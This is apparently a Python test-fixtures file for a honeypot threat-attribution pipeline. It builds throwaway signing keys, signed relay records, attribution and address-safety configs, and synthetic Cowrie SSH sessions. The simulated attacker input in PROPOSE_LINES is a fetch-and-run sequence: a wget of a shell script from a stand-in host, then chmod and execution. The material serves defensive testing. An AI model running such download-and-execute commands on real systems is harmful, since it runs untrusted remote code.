"""Shared fixtures for the Task 26C trust-boundary tests: ephemeral keys (never written), relay record writer, v3
attribution config, address-safety document, policy 2.1, signer helpers and synthetic Cowrie sessions."""
import copy
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from behavioural_evidence import EvidenceConfig, EvidenceEngine
from client_attribution import build_result, config_from_document, correlate, correlate_authentication, sign_result
from client_attribution.records import GENESIS, RECORD_SCHEMA, canonical
from threat_assessment import AttributionConfig, PolicyConfig, ThreatAssessor
from threat_assessment.config import canonical_digest

REPO = Path(__file__).resolve().parents[1]
T0 = datetime(2026, 11, 11, 18, 0, 0, tzinfo=timezone.utc)
RELAY = "172.22.0.2"
TEST_CLIENT, CONTROL_CLIENT, DEMO_RELAY = "10.250.25.3", "10.250.25.4", "10.250.25.2"
DEMO_LISTENER = f"{DEMO_RELAY}:2222"
DIAG = ("99732d516898", "b806554e19b9")
NOW = T0 + timedelta(seconds=60)
PROPOSE_LINES = ["uname -a", "wget http://files.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"]


def iso(t):
    return (T0 + timedelta(seconds=t)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def keypair():
    k = Ed25519PrivateKey.generate()
    raw = k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    pem = k.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    return k, pem, hashlib.sha256(raw).hexdigest()


RELAY_KEY, RELAY_PEM, RELAY_SHA = keypair()          # relay record key (relay role)
RESULT_KEY, RESULT_PEM, RESULT_SHA = keypair()       # attribution result key (attribution component role)
ATTACKER_KEY, ATTACKER_PEM, ATTACKER_SHA = keypair()


class Writer:
    def __init__(self, key=RELAY_KEY, key_sha=RELAY_SHA):
        self.key, self.key_id, self.seq, self.prev, self.lines = key, key_sha[:16], 0, GENESIS, []

    def write(self, rtype, t, **fields):
        self.seq += 1
        rec = {"schema": RECORD_SCHEMA, "seq": self.seq, "prev_hash": self.prev, "record_type": rtype, "written_utc": iso(t),
               "key_id": self.key_id, **fields}
        h = hashlib.sha256(canonical(rec).encode("utf-8")).hexdigest()
        rec["record_hash"], rec["signature"] = h, self.key.sign(h.encode("ascii")).hex()
        self.prev = h
        self.lines.append(canonical(rec))
        return rec

    def start(self, t=-10):
        return self.write("relay_start", t, config_sha256="0" * 64, backend="cowrie:2222", public_key_sha256=RELAY_SHA,
                          listeners=[{"name": "demo", "mode": "demo", "bind": DEMO_RELAY, "port": 2222}])

    def open(self, cid, uport, t, client=TEST_CLIENT, cport=40000, dt=0.01):
        return self.write("connection_open", t + dt, connection_id=cid, listener="demo", listener_mode="demo", ingress_listener=DEMO_LISTENER,
                          client_ip=client, client_port=cport, accepted_local=DEMO_LISTENER, accepted_utc=iso(t),
                          upstream_local_ip=RELAY, upstream_local_port=uport, upstream_peer="172.22.0.1:2222", upstream_connected_utc=iso(t + dt))

    def close(self, cid, uport, t, client=TEST_CLIENT, cport=40000):
        return self.write("connection_close", t, connection_id=cid, listener="demo", client_ip=client, client_port=cport,
                          upstream_local_ip=RELAY, upstream_local_port=uport, closed_utc=iso(t), bytes_in=1, bytes_out=2)


ADDR = {"schema": "address-safety-config-1", "config_version": "test-1",
        "protected_cidrs": ["127.0.0.0/8", "172.22.0.0/16", "192.0.2.0/28", "10.250.25.1/32", "10.250.25.2/32"],
        "shared_source_cidrs": ["198.51.100.0/24"], "enforcement_excluded_sources": ["10.250.25.4/32"],
        "enforcement_allowlist": ["10.250.25.3/32"]}


def att3_doc(addr=ADDR, result_sha=RESULT_SHA, registry=None, **over):
    doc = {"schema": "threat-attribution-config-3", "config_version": "test-3", "source_field": "src_ip",
           "trusted_proxy_cidrs": ["172.22.0.2/32"], "relay_addresses": [RELAY], "internal_cidrs": ["10.0.0.0/8"],
           "address_safety": {"path": "configs/address_safety_v1.json", "config_version": addr["config_version"],
                              "sha256_digest": canonical_digest(addr)},
           "proxy_client_mapping": {"verifier": "client_attribution", "public_key_sha256": RELAY_SHA, "relay_upstream_addresses": [RELAY],
                                    "demo_listeners": [DEMO_LISTENER],
                                    "client_registry": registry or {TEST_CLIENT: {"role": "test_client"}, CONTROL_CLIENT: {"role": "control_client"}},
                                    "correlation_skew_seconds": 2, "max_record_age_seconds": 3600,
                                    "key_validity": {"not_before": "2026-11-11T00:00:00Z", "not_after": "2026-12-11T00:00:00Z"}},
           "attribution_result": {"verifier": "threat_assessment.signed_attribution", "schema": "signed-attribution-result-1",
                                  "status": "provisioned", "public_key_sha256": result_sha, "public_key_path": None,
                                  "key_validity": {"not_before": "2026-11-11T00:00:00Z", "not_after": "2026-12-11T00:00:00Z"},
                                  "max_validity_seconds": 3600},
           "excluded_diagnostic_sessions": list(DIAG)}
    doc.update(over)
    return doc


ATT3 = att3_doc()


def att3(doc=ATT3, addr=ADDR, pem=RESULT_PEM):
    return AttributionConfig.from_document(doc, address_doc=addr, result_public_key_pem=pem)


def policy21(doc=ATT3, addr=ADDR, **over):
    p = json.loads((REPO / "configs" / "defence_policy_v2_2.json").read_text(encoding="utf-8"))
    p["attribution_config"]["sha256_digest"] = canonical_digest(doc)
    p["address_safety_config"]["sha256_digest"] = canonical_digest(addr)
    p.update(over)
    return p


ECFG = EvidenceConfig(relay_sources=frozenset({RELAY}), internal_networks=("10.0.0.0/8",))


def assessor3(doc=ATT3, addr=ADDR, pem=RESULT_PEM, pol=None):
    return ThreatAssessor(att3(doc, addr, pem), PolicyConfig.from_document(pol or policy21(doc, addr)), ECFG)


def cev(sid, eventid, t, src=RELAY, **f):
    return {"eventid": eventid, "session": sid, "timestamp": iso(t), "src_ip": src, "sensor": "s1", **f}


def relay_session(sid, uport, t=0, lines=PROPOSE_LINES, login=True, close=True):
    out = [cev(sid, "cowrie.session.connect", t + 0.02, src_port=uport, dst_ip="172.22.0.1", dst_port=2222)]
    if login:
        out.append(cev(sid, "cowrie.login.success", t + 0.5, username="demo", password="demo-pass"))
    for k, ln in enumerate(lines):
        out.append(cev(sid, "cowrie.command.input", t + 1 + k, input=ln))
    if close:
        out.append(cev(sid, "cowrie.session.closed", t + 1 + len(lines) + 0.01, duration="5.0"))
    return out


def sign(events, lines, doc=ATT3, key=RESULT_KEY, issued=None, validity=600, evaluation=None, checkpoints=None):
    cfg = config_from_document(doc)
    ev = evaluation or NOW
    corr = correlate(events, lines, RELAY_PEM, cfg, evaluation_time=ev, checkpoints=checkpoints)
    res = build_result(corr, correlate_authentication(events), cfg, events, issued or (NOW - timedelta(seconds=5)), validity, ev)
    return sign_result(res, key), corr


def demo(client=TEST_CLIENT, sid="d1", uport=50001, doc=ATT3, login=True):
    events = relay_session(sid, uport, login=login)
    w = Writer()
    w.start()
    w.open("c1", uport, 0, client=client)
    w.close("c1", uport, 1 + len(PROPOSE_LINES))
    rec = EvidenceEngine(ECFG).evaluate(events)["sessions"][0]
    signed, corr = sign(events, w.lines, doc=doc)
    return rec, signed, events, w


def resign(doc, key=RESULT_KEY):
    return sign_result({k: v for k, v in copy.deepcopy(doc).items() if k not in ("signer", "result_hash", "signature")}, key)
